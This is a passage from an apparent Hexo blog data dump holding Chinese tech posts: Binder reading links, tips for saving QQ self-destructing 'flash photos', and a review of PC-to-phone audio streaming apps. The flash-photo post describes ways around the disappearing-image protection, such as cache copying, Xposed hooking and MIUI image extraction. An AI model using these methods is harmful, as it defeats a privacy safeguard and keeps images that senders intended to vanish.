Machine进行备份和恢复之类的办法，这未免有些大动干戈了。我只是想迁移系统偏好设置而已，尤其是触控板、鼠标、键盘等设置的微调，每次换电脑都要重新弄一遍很麻烦的。也但愿官方有更简单的办法来导出这些配置文件，毕竟开源工具更新不及时，也很可能出问题的。</p>\n"},{"layout":"post","title":"Binder机制学习指北","subtitle":"指条明路。","date":"2021-01-30T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n挖坑待填，未完待续……\n\n## 参考\n\n- [写给 Android 应用工程师的 Binder 原理剖析](https://zhuanlan.zhihu.com/p/35519585)\n- [彻底理解Android Binder通信架构](http://gityuan.com/2016/09/04/binder-start-service/)\n- [Android跨进程通信：图文详解 Binder机制 原理](https://blog.csdn.net/carson_ho/article/details/73560642)\n- [Android Bander设计与实现 - 设计篇](https://blog.csdn.net/universus/article/details/6211589)\n- [Binder十万个为什么](https://vanelst.site/2020/08/07/binder-question/)\n- [一次Binder通信最大可以传输多大的数据？](https://www.jianshu.com/p/ea4fc6aefaa8)\n","source":"_posts/2021-01-31-Binder机制学习指北.md","raw":"---\nlayout:     post\ntitle:      Binder机制学习指北\nsubtitle:   指条明路。\ndate:       2021-01-31\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n挖坑待填，未完待续……\n\n## 参考\n\n- [写给 Android 应用工程师的 Binder 原理剖析](https://zhuanlan.zhihu.com/p/35519585)\n- [彻底理解Android Binder通信架构](http://gityuan.com/2016/09/04/binder-start-service/)\n- [Android跨进程通信：图文详解 Binder机制 原理](https://blog.csdn.net/carson_ho/article/details/73560642)\n- [Android Bander设计与实现 - 设计篇](https://blog.csdn.net/universus/article/details/6211589)\n- [Binder十万个为什么](https://vanelst.site/2020/08/07/binder-question/)\n- [一次Binder通信最大可以传输多大的数据？](https://www.jianshu.com/p/ea4fc6aefaa8)\n","slug":"Binder机制学习指北","published":1,"updated":"2024-03-25T07:31:25.865Z","comments":1,"photos":[],"link":"","_id":"cluaufh19003nthe6d7kib30u","content":"<p>挖坑待填，未完待续……</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/35519585\">写给 Android 应用工程师的 Binder 原理剖析</a></li>\n<li><a href=\"http://gityuan.com/2016/09/04/binder-start-service/\">彻底理解Android Binder通信架构</a></li>\n<li><a href=\"https://blog.csdn.net/carson_ho/article/details/73560642\">Android跨进程通信：图文详解 Binder机制 原理</a></li>\n<li><a href=\"https://blog.csdn.net/universus/article/details/6211589\">Android Bander设计与实现 - 设计篇</a></li>\n<li><a href=\"https://vanelst.site/2020/08/07/binder-question/\">Binder十万个为什么</a></li>\n<li><a href=\"https://www.jianshu.com/p/ea4fc6aefaa8\">一次Binder通信最大可以传输多大的数据？</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>挖坑待填，未完待续……</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/35519585\">写给 Android 应用工程师的 Binder 原理剖析</a></li>\n<li><a href=\"http://gityuan.com/2016/09/04/binder-start-service/\">彻底理解Android Binder通信架构</a></li>\n<li><a href=\"https://blog.csdn.net/carson_ho/article/details/73560642\">Android跨进程通信：图文详解 Binder机制 原理</a></li>\n<li><a href=\"https://blog.csdn.net/universus/article/details/6211589\">Android Bander设计与实现 - 设计篇</a></li>\n<li><a href=\"https://vanelst.site/2020/08/07/binder-question/\">Binder十万个为什么</a></li>\n<li><a href=\"https://www.jianshu.com/p/ea4fc6aefaa8\">一次Binder通信最大可以传输多大的数据？</a></li>\n</ul>\n"},{"layout":"post","title":"QQ闪照保存小妙招","subtitle":"指条明路。","date":"2021-02-23T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### QQ闪照\n\n在IM工具中，QQ较之于微信一直是比较前卫的，毕竟年轻用户居多。比如QQ闪照就是一个有趣的功能，而且已经推出很久了（记得大概是V6.5左右）：不管单聊还是群聊都可用，在发送图片时勾选闪照即可，发送成功后所有人都只能看5秒，时间结束后图片被“销毁”，UI层面被打上厚厚的马赛克。\n\n![](https://imgconvert.csdnimg.cn/img_convert/82252e4449cfa83df4d5e4ddea82fa39.png)\n\n这个功能一经推出，不少老司机可谓是既爱又恨，我们暂且不说其功能意义和影响。但是相信大家都思考过，怎么把闪照保存下来？\n\n接下来我们就以Android端QQ为例探索一下闪照的持久化存储方式。\n\n### 截图\n\n想多了哈哈，Android端QQ是直接禁止在闪照页面截图的，所以这条路走不痛。\n\n```java\n// 禁止截屏一行代码搞定\ngetWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);\n```\n\n### 突破5秒限制\n\n这个方法非ROOT用户就不用想了，原理上可以通过类似Xposed的框架来修改这个时间限制，以达到一直查看图片的目的，当然这种做法也比较危险，不排除被腾讯封号。\n\n### 找图片文件\n\n图片消息本质上还是一张图片，肯定是会生成磁盘缓存的，只不过在查看后会删除或者加密文件。网上搜罗之后也有很多类似的方法，原理简单，就是收到闪照消息后，不要查看，而是根据文件修改时间找到相应的存储目录，把里面的文件复制出来。\n\n比如早期的时候是在 `/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/diskcache/` 目录下面，后来又把diskcache改成了 `chatpic/chatimg` ，总之手Q团队会经常变换目录，不是很好找。并且在Android 11之后谷歌加强了外部存储的隐私权限（参考：[Android 11 中的存储机制更新](https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn)），通过文件管理器查看 `Android/data` 目录的时代一去不复返了。\n\n### MIUI传送门\n\n![](https://imgconvert.csdnimg.cn/img_convert/c8a374cfa4d6cd2a7da4701e9a34b169.png)\n\n不知道有多少人会使用这个功能，在MIUI上默认并不是开启的（在设置 - 特色功能下面）。这个玩意早期很简单，就是MIUI系统层面做了拦截，在长按各种文本控件（TextView）时，会自动提取其中的文字——这个其实在某些时候非常方便，比如不可复制的文本。\n\n在某一个版本更新后，图片控件（ImageView）也能提取了。我在偶然一次看QQ闪照时，发现闪照里面的内容可以被传送门抓到，并且保存在本地。这活生生就是个系统级别的外挂呀！\n\n具体操作非常简单，只要打开了传送门功能，在长按查看QQ闪照时，屏幕右边缘就会弹出“图片识别”的按钮，点击就可以提取了（右下角还贴心地做了个保存按钮，最终图片会保存在 `MIUI/taplus` 下面）：\n\n![](https://imgconvert.csdnimg.cn/img_convert/db80b4e135d5209cbd9968a6e70e1293.png)\n\n### 引申\n\n后来我想到很多微信里的表情就是没法像QQ一样保存到本地的，MIUI传送门也可以解决这个问题，只需在表情查看详情页面长按图片即可。\n","source":"_posts/2021-02-24-QQ闪照保存小妙招.md","raw":"---\nlayout:     post\ntitle:      QQ闪照保存小妙招\nsubtitle:   指条明路。\ndate:       2021-02-24\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n---\n\n### QQ闪照\n\n在IM工具中，QQ较之于微信一直是比较前卫的，毕竟年轻用户居多。比如QQ闪照就是一个有趣的功能，而且已经推出很久了（记得大概是V6.5左右）：不管单聊还是群聊都可用，在发送图片时勾选闪照即可，发送成功后所有人都只能看5秒，时间结束后图片被“销毁”，UI层面被打上厚厚的马赛克。\n\n![](https://imgconvert.csdnimg.cn/img_convert/82252e4449cfa83df4d5e4ddea82fa39.png)\n\n这个功能一经推出，不少老司机可谓是既爱又恨，我们暂且不说其功能意义和影响。但是相信大家都思考过，怎么把闪照保存下来？\n\n接下来我们就以Android端QQ为例探索一下闪照的持久化存储方式。\n\n### 截图\n\n想多了哈哈，Android端QQ是直接禁止在闪照页面截图的，所以这条路走不痛。\n\n```java\n// 禁止截屏一行代码搞定\ngetWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);\n```\n\n### 突破5秒限制\n\n这个方法非ROOT用户就不用想了，原理上可以通过类似Xposed的框架来修改这个时间限制，以达到一直查看图片的目的，当然这种做法也比较危险，不排除被腾讯封号。\n\n### 找图片文件\n\n图片消息本质上还是一张图片，肯定是会生成磁盘缓存的，只不过在查看后会删除或者加密文件。网上搜罗之后也有很多类似的方法，原理简单，就是收到闪照消息后，不要查看，而是根据文件修改时间找到相应的存储目录，把里面的文件复制出来。\n\n比如早期的时候是在 `/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/diskcache/` 目录下面，后来又把diskcache改成了 `chatpic/chatimg` ，总之手Q团队会经常变换目录，不是很好找。并且在Android 11之后谷歌加强了外部存储的隐私权限（参考：[Android 11 中的存储机制更新](https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn)），通过文件管理器查看 `Android/data` 目录的时代一去不复返了。\n\n### MIUI传送门\n\n![](https://imgconvert.csdnimg.cn/img_convert/c8a374cfa4d6cd2a7da4701e9a34b169.png)\n\n不知道有多少人会使用这个功能，在MIUI上默认并不是开启的（在设置 - 特色功能下面）。这个玩意早期很简单，就是MIUI系统层面做了拦截，在长按各种文本控件（TextView）时，会自动提取其中的文字——这个其实在某些时候非常方便，比如不可复制的文本。\n\n在某一个版本更新后，图片控件（ImageView）也能提取了。我在偶然一次看QQ闪照时，发现闪照里面的内容可以被传送门抓到，并且保存在本地。这活生生就是个系统级别的外挂呀！\n\n具体操作非常简单，只要打开了传送门功能，在长按查看QQ闪照时，屏幕右边缘就会弹出“图片识别”的按钮，点击就可以提取了（右下角还贴心地做了个保存按钮，最终图片会保存在 `MIUI/taplus` 下面）：\n\n![](https://imgconvert.csdnimg.cn/img_convert/db80b4e135d5209cbd9968a6e70e1293.png)\n\n### 引申\n\n后来我想到很多微信里的表情就是没法像QQ一样保存到本地的，MIUI传送门也可以解决这个问题，只需在表情查看详情页面长按图片即可。\n","slug":"QQ闪照保存小妙招","published":1,"updated":"2024-03-25T07:31:25.866Z","comments":1,"photos":[],"link":"","_id":"cluaufh19003pthe6g8ya2a64","content":"<h3 id=\"QQ闪照\"><a href=\"#QQ闪照\" class=\"headerlink\" title=\"QQ闪照\"></a>QQ闪照</h3><p>在IM工具中，QQ较之于微信一直是比较前卫的，毕竟年轻用户居多。比如QQ闪照就是一个有趣的功能，而且已经推出很久了（记得大概是V6.5左右）：不管单聊还是群聊都可用，在发送图片时勾选闪照即可，发送成功后所有人都只能看5秒，时间结束后图片被“销毁”，UI层面被打上厚厚的马赛克。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/82252e4449cfa83df4d5e4ddea82fa39.png\"></p>\n<p>这个功能一经推出，不少老司机可谓是既爱又恨，我们暂且不说其功能意义和影响。但是相信大家都思考过，怎么把闪照保存下来？</p>\n<p>接下来我们就以Android端QQ为例探索一下闪照的持久化存储方式。</p>\n<h3 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h3><p>想多了哈哈，Android端QQ是直接禁止在闪照页面截图的，所以这条路走不痛。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 禁止截屏一行代码搞定</span></span><br><span class=\"line\">getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"突破5秒限制\"><a href=\"#突破5秒限制\" class=\"headerlink\" title=\"突破5秒限制\"></a>突破5秒限制</h3><p>这个方法非ROOT用户就不用想了，原理上可以通过类似Xposed的框架来修改这个时间限制，以达到一直查看图片的目的，当然这种做法也比较危险，不排除被腾讯封号。</p>\n<h3 id=\"找图片文件\"><a href=\"#找图片文件\" class=\"headerlink\" title=\"找图片文件\"></a>找图片文件</h3><p>图片消息本质上还是一张图片，肯定是会生成磁盘缓存的，只不过在查看后会删除或者加密文件。网上搜罗之后也有很多类似的方法，原理简单，就是收到闪照消息后，不要查看，而是根据文件修改时间找到相应的存储目录，把里面的文件复制出来。</p>\n<p>比如早期的时候是在 <code>/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/diskcache/</code> 目录下面，后来又把diskcache改成了 <code>chatpic/chatimg</code> ，总之手Q团队会经常变换目录，不是很好找。并且在Android 11之后谷歌加强了外部存储的隐私权限（参考：<a href=\"https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn\">Android 11 中的存储机制更新</a>），通过文件管理器查看 <code>Android/data</code> 目录的时代一去不复返了。</p>\n<h3 id=\"MIUI传送门\"><a href=\"#MIUI传送门\" class=\"headerlink\" title=\"MIUI传送门\"></a>MIUI传送门</h3><p><img src=\"https://imgconvert.csdnimg.cn/img_convert/c8a374cfa4d6cd2a7da4701e9a34b169.png\"></p>\n<p>不知道有多少人会使用这个功能，在MIUI上默认并不是开启的（在设置 - 特色功能下面）。这个玩意早期很简单，就是MIUI系统层面做了拦截，在长按各种文本控件（TextView）时，会自动提取其中的文字——这个其实在某些时候非常方便，比如不可复制的文本。</p>\n<p>在某一个版本更新后，图片控件（ImageView）也能提取了。我在偶然一次看QQ闪照时，发现闪照里面的内容可以被传送门抓到，并且保存在本地。这活生生就是个系统级别的外挂呀！</p>\n<p>具体操作非常简单，只要打开了传送门功能，在长按查看QQ闪照时，屏幕右边缘就会弹出“图片识别”的按钮，点击就可以提取了（右下角还贴心地做了个保存按钮，最终图片会保存在 <code>MIUI/taplus</code> 下面）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/db80b4e135d5209cbd9968a6e70e1293.png\"></p>\n<h3 id=\"引申\"><a href=\"#引申\" class=\"headerlink\" title=\"引申\"></a>引申</h3><p>后来我想到很多微信里的表情就是没法像QQ一样保存到本地的，MIUI传送门也可以解决这个问题，只需在表情查看详情页面长按图片即可。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"QQ闪照\"><a href=\"#QQ闪照\" class=\"headerlink\" title=\"QQ闪照\"></a>QQ闪照</h3><p>在IM工具中，QQ较之于微信一直是比较前卫的，毕竟年轻用户居多。比如QQ闪照就是一个有趣的功能，而且已经推出很久了（记得大概是V6.5左右）：不管单聊还是群聊都可用，在发送图片时勾选闪照即可，发送成功后所有人都只能看5秒，时间结束后图片被“销毁”，UI层面被打上厚厚的马赛克。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/82252e4449cfa83df4d5e4ddea82fa39.png\"></p>\n<p>这个功能一经推出，不少老司机可谓是既爱又恨，我们暂且不说其功能意义和影响。但是相信大家都思考过，怎么把闪照保存下来？</p>\n<p>接下来我们就以Android端QQ为例探索一下闪照的持久化存储方式。</p>\n<h3 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h3><p>想多了哈哈，Android端QQ是直接禁止在闪照页面截图的，所以这条路走不痛。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 禁止截屏一行代码搞定</span></span><br><span class=\"line\">getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"突破5秒限制\"><a href=\"#突破5秒限制\" class=\"headerlink\" title=\"突破5秒限制\"></a>突破5秒限制</h3><p>这个方法非ROOT用户就不用想了，原理上可以通过类似Xposed的框架来修改这个时间限制，以达到一直查看图片的目的，当然这种做法也比较危险，不排除被腾讯封号。</p>\n<h3 id=\"找图片文件\"><a href=\"#找图片文件\" class=\"headerlink\" title=\"找图片文件\"></a>找图片文件</h3><p>图片消息本质上还是一张图片，肯定是会生成磁盘缓存的，只不过在查看后会删除或者加密文件。网上搜罗之后也有很多类似的方法，原理简单，就是收到闪照消息后，不要查看，而是根据文件修改时间找到相应的存储目录，把里面的文件复制出来。</p>\n<p>比如早期的时候是在 <code>/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/diskcache/</code> 目录下面，后来又把diskcache改成了 <code>chatpic/chatimg</code> ，总之手Q团队会经常变换目录，不是很好找。并且在Android 11之后谷歌加强了外部存储的隐私权限（参考：<a href=\"https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn\">Android 11 中的存储机制更新</a>），通过文件管理器查看 <code>Android/data</code> 目录的时代一去不复返了。</p>\n<h3 id=\"MIUI传送门\"><a href=\"#MIUI传送门\" class=\"headerlink\" title=\"MIUI传送门\"></a>MIUI传送门</h3><p><img src=\"https://imgconvert.csdnimg.cn/img_convert/c8a374cfa4d6cd2a7da4701e9a34b169.png\"></p>\n<p>不知道有多少人会使用这个功能，在MIUI上默认并不是开启的（在设置 - 特色功能下面）。这个玩意早期很简单，就是MIUI系统层面做了拦截，在长按各种文本控件（TextView）时，会自动提取其中的文字——这个其实在某些时候非常方便，比如不可复制的文本。</p>\n<p>在某一个版本更新后，图片控件（ImageView）也能提取了。我在偶然一次看QQ闪照时，发现闪照里面的内容可以被传送门抓到，并且保存在本地。这活生生就是个系统级别的外挂呀！</p>\n<p>具体操作非常简单，只要打开了传送门功能，在长按查看QQ闪照时，屏幕右边缘就会弹出“图片识别”的按钮，点击就可以提取了（右下角还贴心地做了个保存按钮，最终图片会保存在 <code>MIUI/taplus</code> 下面）：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/db80b4e135d5209cbd9968a6e70e1293.png\"></p>\n<h3 id=\"引申\"><a href=\"#引申\" class=\"headerlink\" title=\"引申\"></a>引申</h3><p>后来我想到很多微信里的表情就是没法像QQ一样保存到本地的，MIUI传送门也可以解决这个问题，只需在表情查看详情页面长按图片即可。</p>\n"},{"layout":"post","title":"忘了买电脑音响？手机来替代！","subtitle":"指条明路。","date":"2021-04-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 背景\n\n前段时间把吃灰的台式电脑搬出来用，我竟然忘了它没配音响，可我现在就想玩游戏听音乐，也不想买音响，怎么办？除此之外，我相信很多公司的办公台式电脑也是没有带音响的，老板告诉你：上个班还要听啥响？好好搬砖就行了。但有时候加班到四下无人的时候，确实会产生一种想要外放音乐的欲望。\n\n此情此景，我摸了摸我的双扬声器小米10，不仅感叹道：你就是个天生的便携音响呀！于是，我开始寻找让手机和电脑通信并传输音频数据的方法。\n\n从流媒体的理论上讲，无非就是电脑将音频数据传输到手机上播放，电脑端作为Server，手机端作为Client，这样一个简单的C/S架构。大致我能想到3种传输方式：\n\n- 通过局域网传输数据（例如同时连接某一WiFi）\n- 通过USB等有线的方式传输数据\n- 通过蓝牙配对连接来传输数据\n\n下面我们就来探索一下现有的可行方案。\n\n## 实践\n\n### AudioRelay\n\n#### 基本信息\n\n- 有官网：[https://audiorelay.net/](https://audiorelay.net/) ，提供Windows和Android应用程序下载。\n- Android端在Play Store上也能搜到，简介就是 **Stream your PC audio on Wifi or USB** ,也一直在保持更新。\n\n#### 体验\n\n下载安装后，先打开PC端，第一次使用时，会有简单的提示引导你检查防火墙是否干扰了正常使用，直接点击 **CHECK FIREWALL** 就可以了。\n\n各项配置简单明了，甚至还支持Dark Mode。同时，局域网IP会自动分配，**此时你的PC就成为一台输出音频数据的Server**。\n\n![AudioRelay6](https://cdn.sspai.com/2021/04/13/5ef82a76495b0c5b1e3720493380f073.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n再打开作为Client的Android端，它会自动搜索局域网内可用的Server，并在音频输出一栏列出，点击后即可自动连接，然后手机就成功成为电脑的音响设备了（还支持多个Client连接同一个Server），真的非常方便。\n\n![AudioRelay1](https://cdn.sspai.com/2021/04/13/1821d860b0a7ad6f422d05c43ff9ec07.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n从显示数据和我个人体验来看，传输延迟是非常低的，基本可以保持在**10毫秒以内**。偶尔会有一点丢包导致的小卡顿，但无伤大雅，玩游戏都是没有问题的。当然音质的话，就不能要求过高了。\n\n连接成功后还可更改输出通道，以便用户进行音质和延迟之间的取舍：\n\n![AudioRelay2](https://cdn.sspai.com/2021/04/13/79087969e71c795dc28449950df43ea5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n如果要追求更低的延迟，建议使用USB连接手机和电脑，我这里主要是使用无线的方式。AudioRelay的设置项也是比较丰富的，可自定义音质、通道和缓冲大小等，大家可自行体验：\n\n![AudioRelay3](https://cdn.sspai.com/2021/04/13/7341e25b789fcfd9438500c8316f71a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n### 同步听\n\n#### 基本信息\n\n- 这是一款非常简单的国产软件，已经有几年没更新了，找不到官网链接，但网上还是能搜到下载资源。\n- 注意我们只需要下载Windows程序即可，因为手机连接电脑后会自动安装Apk。\n\n#### 体验\n\n虽然是老软件，但实用性还是很强的。安装后打开PC端，UI非常小（jian）巧（lou），提示你通过无线或有线的方式连接：\n\n![AudioSync6](https://cdn.sspai.com/2021/04/13/71b2bebaa905578065f27340bc8badc5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n实际使用过程中，无线的方式我目前还没摸索出来要怎么连接。个人理解它这里的通过WiFi连接和AudioRelay的方式不同，是指的手机作为热点，让电脑去连接手机。\n\n那我就试试USB连接吧。连接之前请确保**开启USB调试**，Apk会自动安装，首次打开如果ROM版本比较高的话会有一些系统兼容性提示（因为我是Android 11），但不要紧，不影响使用，包括下面这个错误提示也没事：\n\n![AudioSync4](https://cdn.sspai.com/2021/04/13/78fe4bf1326915d2ca42252ab2dbb566.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n连接成功后，点击收听，两端UI都会变成这种状态，表示已经可以输出音频了，整个过程其实也非常简单：\n\n![AudioSync7](https://cdn.sspai.com/2021/04/13/fa0ebd04591d831a239678c10d69e807.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n同步听几乎没有可配置的选项，但个人体验感觉音质和延迟和AudioRelay基本没有差异，让我挺惊讶的。这完全就是极简实用的典范呢！不搞花里花哨的东西。\n\n### SoundWire\n\n#### 基本信息\n\n- 官网：[http://georgielabs.net/](http://georgielabs.net/)。此软件和AudioRelay的原理和使用方式很类似。\n- Play Store上也能搜到，但从评论反馈来看有很多人使用不了。\n\n#### 体验\n\n还是先安装PC端，打开后发现UI还蛮复古的：\n\n![SoundWire4](https://cdn.sspai.com/2021/04/13/2871a9f8f1e3890a77f2ebbf15efd830.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n会自动生成局域网IP地址，还支持录音什么的。接下来打开Android端，首次使用它会提示你连击中间的图标即可连接，长按是自动检测并连接。然而，不管我是自动还是手动，都没法玩：\n\n![SoundWire1](https://cdn.sspai.com/2021/04/13/57c8e7129b7b1d11d59a1f83f32824e1.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n也不知道是不是Android 11系统版本兼容的问题，总之没法体验了。但看上去应该和AudioRelay是差不多的玩意。\n\n### Steam Link\n\n#### 基本信息\n\n- 谁也没想到我电脑上的Steam也能满足我的需求，其实本质上就是**共享屏幕和远程控制**（流式传输音视频数据），如果你是Steam用户，不妨试试这个。\n- 需要在Android端下载安装Steam Link，Play Store可以搜到。\n\n#### 体验\n\n同样的，需要PC和手机处于同一局域网中，保持PC端打开Steam，然后打开手机上的Steam Link，会自动扫描设备：\n\n![SteamLink6](https://cdn.sspai.com/2021/04/13/186d7c453511da65ab69b288ecee1eaf.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n点击后会先进行测速，这个基本上就是你的WiFi极速，一般情况下传输音视频是没问题的：\n\n![SteamLink3](https://cdn.sspai.com/2021/04/13/b3e0d9652e875b3c6f2b94d458b6a9ab.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n和任何端到端设备配对逻辑一样，需要在PC端输入PIN码即可连接：\n\n![SteamLink8](https://cdn.sspai.com/2021/04/13/c7f11d47e7df4f67c3171acde7f2872d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n连接成功后，就可以用手机来玩电脑上的Steam游戏了，当然也是通过手机来输出电脑音频的，这对家境贫寒又缺音响又缺手柄的我来说，再好不过了。\n\n![SteamLink1](https://cdn.sspai.com/2021/04/13/b3a1649bd736d5009223627382b1f6a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n可实时显示并控制PC端：\n\n![SteamLink2](https://cdn.sspai.com/2021/04/13/1dd4ccf57aedb5eaa9608e6524e42362.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n### 其他\n\n- TeamViewer：这是比较知名的远程控制软件了，不仅支持局域网还支持广域网，原理和使用方式基本和Steam Link差不多，都算是有点大材小用了，毕竟我们只是想输出PC的音频而已。\n- 直播软件：PC端开播，手机看直播，很好理解。不过成本也挺高的。\n\n## 总结\n\n| 方案       | 平台组合          | 音质 | 延迟 | 连接       | 传输   |\n| ---------- | ----------------- | ---- | ---- | ---------- | ------ |\n| AudioRelay | Win+Android       | 中高 | 低   | 局域网/USB | 音频   |\n| 同步听     | Win+Android       | 中高 | 低   | 局域网/USB | 音频   |\n| SoundWire  | Win/Linux+Android | 中高 | 中   | 局域网     | 音频   |\n| Steam Link | 全平台            | 中   | 低   | 局域网     | 音视频 |\n| TeamViewer | 全平台            | 中   | 中高 | 广域网     | 音视频 |\n| 直播软件   | 全平台            | 高   | 低   | 广域网     | 音视频 |\n\n个人综合体验最好的还是AudioRelay，最简单实用的是同步听。\n","source":"_posts/2021-04-20-忘了买电脑音响？手机来替代！.md","raw":"---\nlayout:     post\ntitle:      忘了买电脑音响？手机来替代！\nsubtitle:   指条明路。\ndate:       2021-04-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n---\n\n## 背景\n\n前段时间把吃灰的台式电脑搬出来用，我竟然忘了它没配音响，可我现在就想玩游戏听音乐，也不想买音响，怎么办？除此之外，我相信很多公司的办公台式电脑也是没有带音响的，老板告诉你：上个班还要听啥响？好好搬砖就行了。但有时候加班到四下无人的时候，确实会产生一种想要外放音乐的欲望。\n\n此情此景，我摸了摸我的双扬声器小米10，不仅感叹道：你就是个天生的便携音响呀！于是，我开始寻找让手机和电脑通信并传输音频数据的方法。\n\n从流媒体的理论上讲，无非就是电脑将音频数据传输到手机上播放，电脑端作为Server，手机端作为Client，这样一个简单的C/S架构。大致我能想到3种传输方式：\n\n- 通过局域网传输数据（例如同时连接某一WiFi）\n- 通过USB等有线的方式传输数据\n- 通过蓝牙配对连接来传输数据\n\n下面我们就来探索一下现有的可行方案。\n\n## 实践\n\n### AudioRelay\n\n#### 基本信息\n\n- 有官网：[https://audiorelay.net/](https://audiorelay.net/) ，提供Windows和Android应用程序下载。\n- Android端在Play Store上也能搜到，简介就是 **Stream your PC audio on Wifi or USB** ,也一直在保持更新。\n\n#### 体验\n\n下载安装后，先打开PC端，第一次使用时，会有简单的提示引导你检查防火墙是否干扰了正常使用，直接点击 **CHECK FIREWALL** 就可以了。\n\n各项配置简单明了，甚至还支持Dark Mode。同时，局域网IP会自动分配，**此时你的PC就成为一台输出音频数据的Server**。\n\n![AudioRelay6](https://cdn.sspai.com/2021/04/13/5ef82a76495b0c5b1e3720493380f073.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n再打开作为Client的Android端，它会自动搜索局域网内可用的Server，并在音频输出一栏列出，点击后即可自动连接，然后手机就成功成为电脑的音响设备了（还支持多个Client连接同一个Server），真的非常方便。\n\n![AudioRelay1](https://cdn.sspai.com/2021/04/13/1821d860b0a7ad6f422d05c43ff9ec07.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n从显示数据和我个人体验来看，传输延迟是非常低的，基本可以保持在**10毫秒以内**。偶尔会有一点丢包导致的小卡顿，但无伤大雅，玩游戏都是没有问题的。当然音质的话，就不能要求过高了。\n\n连接成功后还可更改输出通道，以便用户进行音质和延迟之间的取舍：\n\n![AudioRelay2](https://cdn.sspai.com/2021/04/13/79087969e71c795dc28449950df43ea5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n如果要追求更低的延迟，建议使用USB连接手机和电脑，我这里主要是使用无线的方式。AudioRelay的设置项也是比较丰富的，可自定义音质、通道和缓冲大小等，大家可自行体验：\n\n![AudioRelay3](https://cdn.sspai.com/2021/04/13/7341e25b789fcfd9438500c8316f71a5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1)\n\n### 同步听\n\n#### 